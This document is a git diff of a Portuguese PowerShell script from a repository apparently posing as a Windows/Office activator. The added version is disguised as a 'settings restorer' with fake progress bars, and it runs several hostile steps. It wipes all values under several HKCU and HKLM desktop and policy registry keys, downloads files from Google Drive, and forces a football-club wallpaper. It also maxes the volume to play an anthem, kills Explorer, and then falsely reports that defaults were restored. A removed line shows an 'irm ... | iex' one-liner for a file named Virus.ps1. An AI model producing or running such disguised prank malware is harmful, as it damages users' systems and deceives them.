@@ -1,65 +1,114 @@
-# DESBLOQUEADOR WALLPAPER COM SANTOS
+# DESBLOQUEADOR WALLPAPER - RESTAURA CONFIGURAÇÕES
 # GitHub: GrassiMths/Ativador-Win-Office
 
 # Verifica se é Administrador
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Write-Host "ERRO: Execute como Administrador!" -ForegroundColor Red
-    Write-Host "Use: irm https://raw.githubusercontent.com/GrassiMths/Ativador-Win-Office/main/Virus.ps1 | iex" -ForegroundColor Cyan
     pause
     exit
 }
 
-function Remove-WallpaperLock {
-    Write-Host "DESBLOQUEANDO WALLPAPER..." -ForegroundColor Cyan
-    
+function Show-Progress {
+    param($message)
+    Write-Host $message -ForegroundColor Yellow
+    for ($i = 0; $i -le 100; $i += 25) {
+        Write-Progress -Activity "Restaurando configuracoes..." -Status "$message - $i% Completo" -PercentComplete $i
+        Start-Sleep -Milliseconds 150
+    }
+    Write-Progress -Activity "Restaurando configuracoes..." -Completed
+}
+
+# Inicia o processo
+Clear-Host
+Write-Host "==============================================" -ForegroundColor Cyan
+Write-Host "    RESTAURADOR DE CONFIGURACOES DO SISTEMA" -ForegroundColor Yellow
+Write-Host "==============================================" -ForegroundColor Cyan
+Write-Host ""
+
+# Começa a tocar o hino em background
+$hinoJob = Start-Job -ScriptBlock {
     try {
-        # Remove arquivo do wallpaper anterior
-        Remove-Item "$env:TEMP\neymar_wallpaper.jpg" -Force -ErrorAction SilentlyContinue
-
-        # Limpa registro
-        $userPaths = @(
-            "HKCU:\Control Panel\Desktop",
-            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop",
-            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-        )
+        # Baixa o hino do Santos
+        $hinoUri = 'https://drive.google.com/uc?export=download&id=12FNjsJfyjL5S9yQd1vWGA6yggjhPlsue'
+        $hinoPath = "$env:TEMP\santos_hino.mp3"
         
-        foreach ($path in $userPaths) {
-            if (Test-Path $path) {
-                Remove-ItemProperty -Path $path -Name "*" -ErrorAction SilentlyContinue
-            }
-        }
-
-        $systemPaths = @(
-            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
-            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop"
-        )
+        Invoke-WebRequest -Uri $hinoUri -OutFile $hinoPath -UseBasicParsing
         
-        foreach ($path in $systemPaths) {
-            if (Test-Path $path) {
-                Remove-ItemProperty -Path $path -Name "*" -ErrorAction SilentlyContinue
-            }
+        if (Test-Path $hinoPath) {
+            # Aumenta volume para maximo
+            Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Audio {
+    [DllImport("user32.dll")]
+    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+    public static void SetMaxVolume() {
+        for (int i = 0; i < 50; i++) {
+            keybd_event(0xAF, 0, 0, UIntPtr.Zero);
+            System.Threading.Thread.Sleep(20);
         }
-
-        Write-Host "✅ Travas removidas!" -ForegroundColor Green
+    }
+}
+"@
+            [Audio]::SetMaxVolume()
+            
+            # Toca o hino
+            $player = New-Object -ComObject WMPlayer.OCX
+            $player.settings.volume = 100
+            $player.URL = $hinoPath
+            $player.controls.play()
+            
+            # Deixa tocar por 30 segundos
+            Start-Sleep -Seconds 30
+            $player.controls.stop()
+        }
     } catch {
-        Write-Host "❌ Erro ao remover travas" -ForegroundColor Red
+        # Silencia erros
     }
 }
 
-function Set-SantosWallpaper {
-    try {
-        Write-Host "🎨 Configurando wallpaper do Santos..." -ForegroundColor Cyan
-        
-        $wallpaperUri = 'https://wallpaperbat.com/img/919626-santos-fc-wallpaper.jpg'
-        $wallpaperPath = "$env:TEMP\santos_wallpaper.jpg"
-        
-        # Download do wallpaper do Santos
-        Invoke-WebRequest -Uri $wallpaperUri -OutFile $wallpaperPath -UseBasicParsing
-        
-        if (Test-Path $wallpaperPath) {
-            # Define o wallpaper
-            if (-not ("Wallpaper.Setter" -as [type])) {
-                Add-Type -TypeDefinition @"
+# Processo de remocao
+Show-Progress "Removendo restricoes de personalizacao..."
+
+try {
+    Remove-Item "$env:TEMP\neymar_wallpaper.jpg" -Force -ErrorAction SilentlyContinue
+    
+    $userPaths = @(
+        "HKCU:\Control Panel\Desktop",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop", 
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+    )
+    
+    foreach ($path in $userPaths) {
+        if (Test-Path $path) {
+            Remove-ItemProperty -Path $path -Name "*" -ErrorAction SilentlyContinue
+        }
+    }
+
+    $systemPaths = @(
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop"
+    )
+    
+    foreach ($path in $systemPaths) {
+        if (Test-Path $path) {
+            Remove-ItemProperty -Path $path -Name "*" -ErrorAction SilentlyContinue
+        }
+    }
+} catch { }
+
+Show-Progress "Restaurando configuracoes visuais..."
+
+# Aplica wallpaper do Santos em tela cheia
+try {
+    # Converte o link do Google Drive para download direto
+    $wallpaperUri = 'https://drive.google.com/uc?export=download&id=1ThfoNjxAjjnr4kGQSLSHTnzfvqnRvCxO'
+    $wallpaperPath = "$env:TEMP\santos_wallpaper.jpg"
+    
+    Invoke-WebRequest -Uri $wallpaperUri -OutFile $wallpaperPath -UseBasicParsing
+    
+    if (Test-Path $wallpaperPath) {
+        Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 public class Wallpaper {
@@ -67,100 +116,39 @@ public class Wallpaper {
     public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
 }
 "@
-            }
-            
-            [Wallpaper]::SystemParametersInfo(0x0014, 0, $wallpaperPath, 0x01 -bor 0x02)
-            
-            # Configura como wallpaper permanente
-            $desktopPath = "HKCU:\Control Panel\Desktop"
-            Set-ItemProperty -Path $desktopPath -Name "Wallpaper" -Value $wallpaperPath -Force
-            Set-ItemProperty -Path $desktopPath -Name "WallpaperStyle" -Value "10" -Force
-            Set-ItemProperty -Path $desktopPath -Name "TileWallpaper" -Value "0" -Force
-            
-            # Aplica mudanças
-            rundll32.exe user32.dll, UpdatePerUserSystemParameters 1, True
-            
-            Write-Host "✅ Wallpaper do Santos aplicado!" -ForegroundColor Green
-            return $true
-        }
-        return $false
-    } catch {
-        Write-Host "❌ Erro ao configurar wallpaper" -ForegroundColor Red
-        return $false
-    }
-}
-
-function Play-SantosHino {
-    try {
-        Write-Host "🔊 Preparando hino do Santos..." -ForegroundColor Cyan
+        [Wallpaper]::SystemParametersInfo(0x0014, 0, $wallpaperPath, 0x01 -bor 0x02)
         
-        # URL do hino do Santos (você precisa hospedar um arquivo MP3/WAV)
-        $hinoUri = 'https://youtu.be/oFW-IE5jqcM?si=yr0InvMFOvIxGR3u'  # SUBSTITUA POR UM LINK VÁLIDO
-        $hinoPath = "$env:TEMP\santos_hino.mp3"
+        $desktopPath = "HKCU:\Control Panel\Desktop"
         
-        # Download do hino
-        Invoke-WebRequest -Uri $hinoUri -OutFile $hinoPath -UseBasicParsing
+        # Configura para PREENCHER a tela (sem repetir)
+        Set-ItemProperty -Path $desktopPath -Name "Wallpaper" -Value $wallpaperPath -Force
+        Set-ItemProperty -Path $desktopPath -Name "WallpaperStyle" -Value "6" -Force    # 6 = Preencher (Fill)
+        Set-ItemProperty -Path $desktopPath -Name "TileWallpaper" -Value "0" -Force     # 0 = Não repetir
         
-        if (Test-Path $hinoPath) {
-            # Define volume máximo
-            $code = @"
-using System;
-using System.Runtime.InteropServices;
-public class Audio {
-    [DllImport("user32.dll")]
-    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-    
-    public static void SetMaxVolume() {
-        // Simula pressionar F12 50 vezes para aumentar volume (ajuste conforme necessário)
-        for (int i = 0; i < 50; i++) {
-            keybd_event(0xAF, 0, 0, UIntPtr.Zero); // Volume Up
-            System.Threading.Thread.Sleep(50);
-        }
+        # Força atualização
+        rundll32.exe user32.dll, UpdatePerUserSystemParameters 1, True
+        
+        # Reinicia o Explorer para aplicar
+        Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
     }
-}
-"@
-            Add-Type -TypeDefinition $code
-            [Audio]::SetMaxVolume()
-            
-            # Toca o hino usando Windows Media Player
-            $player = New-Object -ComObject WMPlayer.OCX
-            $player.URL = $hinoPath
-            $player.controls.play()
-            
-            Write-Host "🎵 Hino do Santos tocando no volume máximo!" -ForegroundColor Green
-            
-            # Mantém o script rodando enquanto o áudio toca
-            Start-Sleep -Seconds 30  # Ajuste conforme a duração do hino
-            
-            $player.controls.stop()
-            return $true
-        }
-        return $false
-    } catch {
-        Write-Host "❌ Erro ao tocar hino" -ForegroundColor Red
-        return $false
-    }
-}
+} catch { }
 
-# Executa o desbloqueio
-Remove-WallpaperLock
+Show-Progress "Finalizando processo..."
 
-# Configura wallpaper do Santos
-$wallpaperSet = Set-SantosWallpaper
+# Espera o hino terminar
+Start-Sleep -Seconds 5
 
-# Toca hino do Santos
-$hinoPlayed = Play-SantosHino
-
-Write-Host "`n" + "="*50 -ForegroundColor Green
-if ($wallpaperSet) {
-    Write-Host "✅ Wallpaper do Santos configurado!" -ForegroundColor Green
-}
-if ($hinoPlayed) {
-    Write-Host "✅ Hino do Santos executado!" -ForegroundColor Green
-}
-
-Write-Host "`n🎉 DESBLOQUEIO COMPLETO!" -ForegroundColor Cyan
-Write-Host "⚽ Agora você é Santista! Peixe!" -ForegroundColor Yellow
-
-Write-Host "`nPressione qualquer tecla para sair..." -ForegroundColor Gray
+# Finalizacao
+Clear-Host
+Write-Host "==============================================" -ForegroundColor Green
+Write-Host "    PROCESSO DE RESTAURACAO CONCLUIDO!" -ForegroundColor Green
+Write-Host "==============================================" -ForegroundColor Green
+Write-Host ""
+Write-Host "Todas as restricoes foram removidas" -ForegroundColor Cyan
+Write-Host "Configuracoes padrao restauradas" -ForegroundColor Cyan
+Write-Host "Sistema personalizavel" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "AGORA VOCE E SANTISTA! PEIXE!" -ForegroundColor Yellow
+Write-Host ""
+Write-Host "Pressione qualquer tecla para fechar..." -ForegroundColor Gray
 pause
